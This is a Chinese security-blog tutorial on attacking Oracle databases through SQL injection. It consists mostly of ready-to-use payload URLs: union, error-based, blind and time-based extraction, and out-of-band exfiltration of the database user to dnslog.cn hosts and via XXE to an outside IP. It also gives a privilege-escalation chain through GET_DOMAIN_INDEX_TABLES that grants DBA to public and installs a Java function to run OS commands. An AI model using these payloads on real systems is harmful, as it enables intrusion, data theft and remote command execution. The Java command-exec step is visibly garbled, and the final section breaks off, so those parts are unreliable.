\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/gvbf0wvpMmVXNYBBy-uCdg)

****文章源自-投稿****

**作者-lbug**

**扫描下方二维码进入社区：**

**![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK3Fc7MgHHCICGGSg2l58vxaP5QwOCBcU48xz5g8pgSjGds3Oax0BfzyLkzE9Z6J4WARvaN6ic0GRQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)**

**1、基本概念**

**Oracle和MySQL数据库语法大致相同，结构不太相同,对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP。  
**

  

**1\. SYSTEM：这个用于是存储系统表和管理配置等基本信息**

**2\. SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担**

**3\. UNDOTBS：用于事务回退等**

**4\. TEMP：作为缓存空间减少内存负担**

**5\. USERS：就是存储我们定义的表和数据**

  

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

**在Oracle中每个表空间中都存在一张dual名称的表，这张表并没有实际的存储意义，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来进行注入，例如：select 1+1 from dual。**

**再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，我们称之为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：**

**1\. sys：相当于 Linux 下的 root 用户。为 DBA 角色**

**2\. system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。**

**3\. public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）**

  

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

**2、基本语法**

**select column, group\_function(column)  
**

**from table**

**\[where condition\]**

**\[group by group\_by\_expression\]**

**\[having group\_condition\]**

**\[order by column\];**

  

**1、Oracle要求select后必须指明要查询的表名，可以用dual。**

**2、Oracle使用 || 拼接字符串，MySQL中为或运算。**

**单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate。**

**3、Oracle中limit应该使用虚表中的rownum字段通过where条件判断。**

**4、Oracle中没有空字符，''和’null’都是null，而MySQL中认为''是一个字符串。**

  

**Oracle的系统表：**

**– dba\_tables : 系统里所有的表的信息，需要DBA权限才能查询**

**– all\_tables : 当前用户有权限的表的信息**

**– user\_tables: 当前用户名下的表的信息**

**– DBA\_ALL\_TABLES：DBA 用户所拥有的或有访问权限的对象和表**

**– ALL\_ALL\_TABLES：某一用户拥有的或有访问权限的对象和表**

**– USER\_ALL\_TABLES：某一用户所拥有的对象和表**

**DBA\_TABLES >= ALL\_TABLES >= USER\_TABLES**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3、注入类型**

**3.1. 联合查询**

****1、order by 猜字段数量****

**union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：  
**

**http://localhost:8080/oracleInject/index?username=admin' union select null,null,null from dual -- 正常**

**http://localhost:8080/oracleInject/index?username=admin' union select 1,null,null from dual -- 正常说明第一个字段是数字型**

**http://localhost:8080/oracleInject/index?username=admin' union select 1,2,null from dual -- 第二个字段为数字时错误**

**http://localhost:8080/oracleInject/index?username=admin' union select 1,'asd',null from dual -- 正常 为字符串 依此类推**

**SQL**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**2、查数据库版本和用户名**

**http://localhost:8080/oracleInject/index?username=admin' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like 'Oracle%25') from dual --** 

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3、查当前数据库**

**http://localhost:8080/oracleInject/index?username=admin' union select 1,(SELECT global\_name FROM global\_name),null from dual --**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**4、查表**

**wmsys.wm\_concat()等同于MySQL中的group\_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代**

**http:**

**//localhost:8080/oracleInject/index?username=admin' union select 1,(select LISTAGG(table\_name,',')within group(order by owner)name from all\_tables where owner='SYSTEM'),null from dual --** 

  

**但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**5、查字段**

  

**http://localhost:8080/oracleInject/index?username=admin' union select 1,(select column\_name from all\_tab\_columns where table\_name='TEST' and rownum=2),null from dual --** 

**有表名字段名出数据就不说了。**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3.2. 报错注入**

**utl\_inaddr.get\_host\_name**

select utl\_inaddr.get\_host\_name((select user from dual)) from dual;

**11g之后，使用此函数的数据库用户需要有访问网络的权限**

  

**ctxsys.drithsx.sn**

select ctxsys.drithsx.sn(1, (select user from dual)) from dual;

**处理文本的函数，参数错误时会报错。**

**CTXSYS.CTX\_REPORT.TOKEN\_TYPE**

select CTXSYS.CTX\_REPORT.TOKEN\_TYPE((select user from dual), '123') from dual;

**XMLType**

http://localhost:8080/oracleInject/index?username=admin' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --

**注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。**

**dbms\_xdb\_version.checkin**

select dbms\_xdb\_version.checkin((select user from dual)) from dual;

**dbms\_xdb\_version.makeversioned**

select dbms\_xdb\_version.makeversioned((select user from dual)) from dual;

**dbms\_xdb\_version.uncheckout**

select dbms\_xdb\_version.uncheckout((select user from dual)) from dual;

**dbms\_utility.sqlid\_to\_sqlhash**

SELECT dbms\_utility.sqlid\_to\_sqlhash((select user from dual)) from dual;

**ordsys.ord\_dicom.getmappingxpath**

select ordsys.ord\_dicom.getmappingxpath((select user from dual), 1, 1) from dual;

**UTL\_INADDR.get\_host\_name**

select UTL\_INADDR.get\_host\_name((select user from dual)) from dual;

**UTL\_INADDR.get\_host\_address**

select UTL\_INADDR.get\_host\_name('~'||(select user from dual)||'~') from dual;

  

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3.3. 盲注**

**布尔盲注**

**布尔盲注第一种是可以使用简单的字符串比较来进行，比如：**

http://localhost:8080/oracleInject/index?username=admin' and (select substr(user, 1, 1) from dual)='S' --

  

**然后还有一种是通过decode配合除数为0来进行布尔盲注**。

http://localhost:8080/oracleInject/index?username=admin' and 1=(select decode(substr(user, 1, 1), 'S', (1/1),0) from dual) --

  

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**时间盲注**

**1、大量数据**

select count(\*) from all\_objects

**缺点就是不准。**

  

  

**2、时间延迟函数**

select 1 from dual where DBMS\_PIPE.RECEIVE\_MESSAGE('asd', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'S', 10))=1;

SQL

  

**还可以配合decode**

**select** **decode****(****substr****(user,1,1),'S',****dbms\_pipe****.****receive\_message****('RDS',10),0)** **from** **dual****;**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3.4. 带外盲注**

**类似于MySQL load\_file的带外盲注。OOB 都需要发起网络请求的权限，有限制。  
**

**utl\_http.request    需要出外网HTTP**

**utl\_inaddr.get\_host\_address    dns解析带外**

**select utl\_inaddr.get\_host\_address((select user from dual)||'.cbb1ya.dnslog.cn') from dual**

**SYS.DBMS\_LDAP.INIT 这个函数在 10g/11g 中是 public 权限.**

**SELECT DBMS\_LDAP.INIT((select user from dual)||'.24wypw.dnslog.cn',80) FROM DUAL;**

**HTTPURITYPE**

**SELECT HTTPURITYPE((select user from dual)||'.24wypw.dnslog.cn').GETCLOB() FROM DUAL;**

  

  

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**其他**

**如果 Oracle 版本 <= 10g，可以尝试以下函数：  
**

**1\. UTL\_INADDR.GET\_HOST\_ADDRESS**

**2\. UTL\_HTTP.REQUEST**

**3\. HTTP\_URITYPE.GETCLOB**

**4\. DBMS\_LDAP.INIT and UTL\_TCP**

  

**Oracle XXE (CVE-2014-6577)**

**说是xxe，实际上应该算是利用xml的加载外部文档来进行数据带外。支持http和ftp**

**1\. http**

**select 1 from dual where 1=(select extractvalue(xmltype('<?xml** 

**version="1.0" encoding="UTF-8"?><!DOCTYPE root \[ <!ENTITY % remote** 

**SYSTEM "http://192.168.124.1/'||(SELECT user from** 

**dual)||'"> %remote;\]>'),'/l') from dual);** 

**2、ftp**

**select extractvalue(xmltype('<?xml version="1.0"** 

**encoding="UTF-8"?><!DOCTYPE root \[ <!ENTITY % remote SYSTEM** 

**"ftp://'||user||':bar@IP/test"> %remote; %param1;\]>'),'/l') from dual;**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**4、提权**

**GET\_DOMAIN\_INDEX\_TABLES函数注入  
**

**影响版本:**

**Oracle 8.1.7.4,** 

**Oracle9.2.0.1 – 9.2.0.7,** 

**Oracle10.1.0.2 – 10.1.0.4,** 

**Oracle10.2.0.1-10.2.0.2**

**漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**1、权限提升**

**http://localhost:8080/oracleInject/index?username=admin' and** **(SYS.DBMS\_EXPORT\_EXTENSION.GET\_DOMAIN\_INDEX\_TABLES('FOO','BAR','DBMS \_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS\_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0)) is not null--  
**

**SQL**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**2、创建Java代码执行命令**

**http://localhost:8080/oracleInject/index?user as import java.io.\*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual) is not null --**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**3、赋予Java执行权限**

**http://localhost:8080/oracleInject/index?username=admin' and (select**

**SYS.DBMS\_EXPORT\_EXTENSION.GET\_DOMAIN\_INDEX\_TABLES('FOO','BAR','DBMS\_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS\_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms\_java.grant\_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is not null --**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**4、创建函数**

**http://localhost:8080/oracleInject/index?username=admin' and (select**

**SYS.DBMS\_EXPORT\_EXTENSION.GET\_DOMAIN\_INDEX\_TABLES('FOO','BAR','DBMS\_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS\_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p\_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is not null --**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**5、赋予函数执行权限**

**http://localhost:8080/oracleInject/index?username=admin' and (select**

**SYS.DBMS\_EXPORT\_EXTENSION.GET\_DOMAIN\_INDEX\_TABLES('FOO','BAR','DBMS\_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS\_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

**6、执行命令**

**http://localhost:8080/oracleInject/index?username=admin' and (select sys.cmd('cmd.exe /c whoami') from dual) is not null--  
**

### **xml反序列化绕过JVM执行命令 CVE-2018-3004**

如果当前数据库用户具有connect和resource权限，则可以尝试使用反序列化来进行执行命令。Oracle Enterprise Edition 有一个嵌入数据库的Java虚拟机，而Oracle数据库则通过Java存储过程来支持Java的本地执行。

\--create or replace function get\_java\_property(prop in varchar2) return varchar2--   is language java name 'java.lang.System.getProperty(java.lang.String) return java.lang.String';--/select get\_java\_property('java.version') from dual;

**原作者写的是**java.name.System**，这里应该使用**java.lang.System

虽然你以为可以执行Java代码了，直接冲Runtime.getRuntime().exec()就完事了，但是实际上Oracle对权限进行了细致的划分，并不能直接冲。我们可以用一个xml的反序列化来冲。

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**通知！**

**公众号招募文章投稿小伙伴啦！只要你有技术有想法要分享给更多的朋友，就可以参与到我们的投稿计划当中哦~感兴趣的朋友公众号首页菜单栏点击【商务合作-我要投稿】即可。期待大家的参与~**

**![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

**记得扫码**

**关注我们**